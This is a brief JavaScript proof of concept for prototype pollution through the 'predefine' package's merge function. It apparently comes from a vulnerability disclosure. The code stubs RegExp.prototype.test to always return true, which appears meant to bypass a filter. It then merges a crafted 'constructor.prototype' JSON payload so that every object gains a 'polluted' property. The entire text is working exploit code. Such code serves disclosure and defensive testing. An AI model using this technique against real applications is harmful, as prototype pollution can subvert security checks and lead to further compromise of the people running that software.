RegExp.prototype.test = () => true;
console.log({}.polluted);
var predefine = require('predefine');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
predefine.merge({}, payload);
console.log({}.polluted);